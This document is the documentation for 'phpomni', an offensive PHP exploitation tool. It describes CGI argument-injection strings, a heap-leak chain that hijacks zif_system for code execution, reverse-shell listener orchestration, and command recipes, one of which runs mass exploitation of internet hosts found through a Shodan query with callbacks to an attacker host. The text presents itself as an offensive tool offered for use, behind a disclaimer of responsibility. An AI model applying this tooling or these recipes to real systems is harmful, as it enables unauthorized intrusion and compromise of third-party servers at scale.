I AM NOT RESPONSIBLE FOR MISS USE UNDER ANY CIRCUMSTANCE!! USE WISELY made with love from me and my ai assistant.  
phpomni v4.2.3 — Red Team Operator Documentation

phpomni is a multi-prong PHP exploitation tool engineered for automated initial access, behavioral environment profiling, and native interactive PTY reverse-shell orchestration. The script consolidates legacy and modern PHP vulnerabilities into a single operational workflow that dynamically adjusts its heap-grooming and delivery strategies based on real-time feedback from the target.

How It Works (Operator Mechanics)

The script executes a multi-stage attack lifecycle to achieve remote code execution (RCE) while minimizing worker destabilization and footprint.

1. Passive Reconnaissance & SAPI Profiling

• Version & OS Detection: Inspects Server and X-Powered-By HTTP headers to extract PHP versions and pinpoint the host operating system.
• Active Entry-Point Hunting: If pointing directly at a static page or directory root, the tool automatically fuzzes a checklist of standard PHP files (index.php, login.php, wp-login.php, admin.php, info.php, phpinfo.php) to find a live execution path.
• SAPI Fingerprinting: Sends a non-existent script request to profile how the backend processes PHP. If it returns specific FastCGI handlers like "File not found." or "No input file specified.", it identifies the environment as PHP-FPM and bypasses the CGI prong to avoid generating noisy logs or unnecessary traffic.

2. Prong 1: CGI Argument Injection (Windows Targets)

• Vulnerabilities: Exploits CVE-2024-4577 (using soft-hyphen %AD) and CVE-2024-8926 (using codepage-bypass quotes %a8-d%a8 or %A0-d%A0).
• Execution: Overrides PHP-CGI query string processing to force directive injection (allow_url_include=1 and auto_prepend_file=php://input). The script feeds the PHP payload directly into the POST body, achieving immediate execution.

3. Prong 2 & 3: PHP2Shell Heap Exploitation (Linux Targets)

• Vulnerabilities: Exploits CVE-2026-109618 and CVE-2026-109619.
• Pre-Grooming Rotation & Heap Spray: Sends a sequence of varied-shape multipart POST requests containing the PHP_SESSION_UPLOAD_PROGRESS parameter. This normalizes and aligns the Zend Engine heap allocator layout across varying distributions, preventing worker crashes.
• Stage 1 (Heap Address Leak): Triggers an out-of-memory (OOM) prelude by exhausting the worker’s memory_limit using a large multipart field. This forces the reflection of raw heap pointers into the Set-Cookie session response to calculate the exact Zend chunk base address.
• Stage 2 (Libphp Base Address Leak): Uses the leaked chunk address to dynamically validate pre-configured binary offset profiles (bookworm, lab, or custom JSON configurations) to extract the absolute base address of the libphp.so library.
• Stage 3 (ZIF Hijack & Blind Execution): Fakes a controlled Zend String data structure inside the leaked heap space, replacing its function pointer with the address of zif_system. It then places a compact shell command payload (max 14 bytes) directly into the function argument array to gain code execution.

4. PTY Reverse-Shell Listener Orchestration

• Asynchronous Socket Engine: Spawns a multi-session listener on 0.0.0.0 to capture inbound connections.
• PTY Upgrading: If a connection returns from a Linux target, it invokes an internal Python payload that spawns a real PTY (pty.spawn('/bin/sh')).
• Geometry Synchronization: Queries your current terminal geometry (stty rows/cols) and pushes those variables to the target via the reverse shell, granting an immediate, stable, fully interactive shell environment that supports Ctrl+C, Ctrl+Z, and text editors.

Core Operational Arguments


Target Selection & Commands

• -u, --url [STR]
Defines the target URL path (e.g., http://target/index.php). Must provide either this or --shodan.
• -c, --cmd [STR]
The command string to pass to the target. Default is id. Note: Must be 14 bytes or fewer if targeting the PHP2Shell heap exploit (e.g., sh</tmp/c).
• --fetch [STR]
An application path to issue a HTTP GET request against immediately after PHP2Shell Stage 3 to verify or grab blind command execution proof.

Reverse-Shell Orchestration

• --lhost [STR]
The callback IP address placed into reverse-shell payloads (e.g., pivot machine, team server, or NAT boundary). If omitted, the script attempts to auto-detect the local interface routing toward the target.
• --lport [INT]
The port for the local reverse shell listener. Activating this option initializes the native PTY interactive engine. Default is 4444 if --lhost is defined.
• --no-interact
Prevents the script from taking over stdin/stdout for an interactive PTY session after a successful connection. Useful for automated scripts or multi-target logging.

Target Pre-Gating & Bypass Controls

• --no-sapi-scan
Disables the SAPI fingerprinting and entry-point detection layer entirely. Forces the exploit loop to blindly fire every prong and prevents skipping seemingly static HTML landing targets.
• --force
Bypasses all client-side pre-gating logic. Forces the tool to fire all exploit prongs even if headers suggest the target is running a patched version, an incompatible legacy PHP engine, or a static page.
• --trust-banner
Skips prongs 2 and 3 if the server or X-Powered-By banner lists a version known to be upstream-patched. Highly recommended for high-volume automated mass scanning where real-time leak validation is too slow.
• --ignore-ssl
Skips TLS certificate validation. Essential when auditing systems with self-signed, expired, or hostname-mismatched internal SSL certificates.

Heap Grooming & Precision Adjustments

• --spray-cycles [INT]
Specifies the number of varied-shape multipart POST requests used to groom and normalize the remote heap memory layout before attempting Stage 1. Default is 6.
• --no-spray
Disables the heap spray grooming phase entirely.
• --no-pre-rotate
Skips the preliminary multipart cycle designed to cycle old Zend workers and clear lingering heap fragmentation.
• --huge-mb [INT]
Size of the large multipart field (in Megabytes) sent to force the worker over its memory_limit threshold. Default is 12. The tool will automatically scale this value up or down dynamically based on HTTP 413 rejections or OOM survival indicators.
• --retries [INT]
Maximum connection attempts allowed per individual memory leak stage in prongs 2 and 3. Default is 3.
• --timeout [FLOAT]
Network socket timeout limit in seconds for baseline application requests. Default is 30.0.

Binary Offsets & Target Profiling

• --profile [choices: "lab", "bookworm"]
Biases the execution order of internal offset tables toward a specific predefined build profile. Default is bookworm. If the primary profile fails to leak memory, alternative profiles are automatically tried as fallbacks.
• --offsets-json [STR]
Path to a JSON file containing customized target offset configurations (e.g., custom compiled corporate Linux distributions or unprofiled builds). Matching fingerprints in this file take execution priority.
• --zif-offset [INT/HEX]
Explicitly sets the zif_system function address offset inside the target's libphp.so library. Overrides automatic signatures and switches the tool into single-candidate mode. Supports integer or hex notation (e.g., 0x43A870).
• --dtor-offset [INT/HEX]
Explicitly sets the ZVAL_PTR_DTOR memory offset inside the target's libphp.so library. Overrides automatic signatures and switches the tool into single-candidate mode. Supports integer or hex notation (e.g., 0x613C50).
• --htdata-offset [INT/HEX]
Explicitly sets the chunk-relative offset of the 167-byte live string carrier payload. Overrides automatic signatures and switches the tool into single-candidate mode. Supports integer or hex notation (e.g., 0x690D8).

Shodan OSINT Automation

• --shodan [STR]
Shodan search syntax query string (e.g., "x-powered-by: PHP/8.3") to run mass automated profiling and exploitation across matching internet targets. Must provide either this or -u/--url.
• --api-key [STR]
Your Shodan API Developer/Corporate Key. Defaults to the value of the SHODAN_API_KEY environmental variable if not explicitly declared on the command-line.
• --shodan-limit [INT]
The maximum number of distinct hosts to pull from Shodan query lookups per individual execution run. Default is 10.

Global Console Output

• -q, --quiet
Suppresses runtime verbose telemetry logging and status indicators. Only primary exploit findings (PWNED / NOT PWNED) and active shell connections will display on stdout.

Red Team Operator Recipes & Examples


Single Target Interactive Penetration (Auto-Routing Payload)

Fire all exploitation vectors against a specific target. Auto-discover the interface path back to the target machine, spawn a listener on port 4444, and instantly drop into a raw PTY interactive terminal session upon exploitation:
bash
python3 phpomni.py -u http://10.10.11.45 --lport 4444
Use code with caution.

Pivot-Box Callback (Explicit Listener & SSL Bypass)

When attacking from an internal testing position where callbacks must route through a specific network interface, team server, or SSH pivot node, bypassing self-signed cert blocks:
bash
python3 phpomni.py -u https://internal-target.local -c "id" --lhost 192.168.1.50 --lport 8443 --ignore-ssl
Use code with caution.

Precision Target Control (Hardcoded Offsets & Tailored Fields)

Target a specific compiled production system by completely overriding signature profiles, executing hardcoded memory addresses directly, and specifying custom OOM limits and tight network timeouts:
bash
python3 phpomni.py -u http://target.local --zif-offset 0x43A870 --dtor-offset 0x613C50 --htdata-offset 0x690D8 --huge-mb 8 --timeout 15.5
Use code with caution.

Targeted OSINT Shodan Campaign (Stealth Profile Optimization)

Query Shodan to hunt for specific exposed PHP configurations, limit processing to 25 targets, trust reported banners to skip patched boxes, suppress debugging chatter, and route reverse shells through a designated server:
bash
export SHODAN_API_KEY="XYZA1234..."
python3 phpomni.py --shodan "X-Powered-By: PHP/8.3" --shodan-limit 25 --trust-banner --quiet --lhost 10.10.14.2 --lport 4444
Use code with caution.
